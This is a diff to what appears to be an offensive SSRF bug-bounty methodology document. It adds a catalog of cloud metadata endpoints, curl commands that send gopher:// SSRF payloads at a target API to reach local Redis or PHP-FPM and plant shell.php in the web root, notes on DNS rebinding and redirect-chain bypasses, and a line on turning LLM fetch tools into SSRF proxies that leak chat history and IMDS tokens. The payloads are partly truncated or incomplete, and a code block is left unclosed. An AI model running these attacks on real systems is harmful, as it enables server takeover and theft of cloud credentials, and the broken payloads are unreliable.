@@ -450,6 +450,40 @@ The following real, verified bug-bounty / coordinated-disclosure cases extend th
 
 ## Related Skills & Chains
 
+### Phase X — Cloud Metadata Catalog
+
+| Provider | Metadata Endpoint |
+|---|---|
+| AWS IMDSv1 | `http://169.254.169.254/latest/meta-data/` |
+| AWS IMDSv2 | Requires `X-aws-ec2-metadata-token` header |
+| AWS ECS | `http://169.254.170.2/v2/metadata/` |
+| GCP | `http://metadata.google.internal/computeMetadata/v1/` |
+| Azure | `http://169.254.169.254/metadata/instance?api-version=2021-02-01` |
+| DigitalOcean | `http://169.254.169.254/metadata/v1.json` |
+| Oracle Cloud | `http://169.254.169.254/opc/v2/instance/` |
+| Alibaba Cloud | `http://100.100.100.200/latest/meta-data/` |
+
+### Phase Y — Gopher Protocol SSRF to Redis/FastCGI RCE
+
+```bash
+# Redis RCE via gopher SSRF (if Redis on localhost:6379 without auth)
+curl -sk -X POST "https://target.com/api/fetch" \
+  -d '{"url":"gopher://127.0.0.1:6379/_SET%20crack%20test%0d%0aCONFIG%20SET%20dir%20/var/www/html%0d%0aCONFIG%20SET%20dbfilename%20shell.php%0d%0a"}'
+
+# FastCGI RCE via gopher (PHP-FPM on localhost:9000)
+curl -sk -X POST "https://target.com/api/fetch" \
+  -d '{"url":"gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00..."}'
+```
+
+### Phase Z — DNS Rebinding + Redirect Chain Bypass
+
+```bash
+# DNS rebinding — bypass IP allowlists by resolving to allowed IP first, then to internal IP
+# Set up domain rbndr.us with TTL=0, alternating A records
+
+# Redirect chain — bypass URL blocklist via 302 chain
+# Attacker server 302 → http://169.254.169.254/latest/meta-data/
+
 - **`cloud-iam-deep`** — SSRF is the canonical entry to cloud metadata service. Chain primitive: SSRF → IMDSv1 token theft → `cloud-iam-deep` privilege escalation reaches `iam:CreateUser` / `sts:AssumeRole` on cross-account roles.
 - **`hunt-cloud-misconfig`** — Internal-only buckets/APIs become reachable through SSRF egress. Chain primitive: SSRF + DNS rebinding → SSRF-protected-endpoint bypass → internal /admin or private S3 bucket read.
 - **`hunt-llm-ai`** — LLMs with fetch_url tools become SSRF proxies bypassing network egress controls. Chain primitive: LLM tool-use (fetch_url) + SSRF → attacker URL exfils chat history and IMDS token from the LLM container.
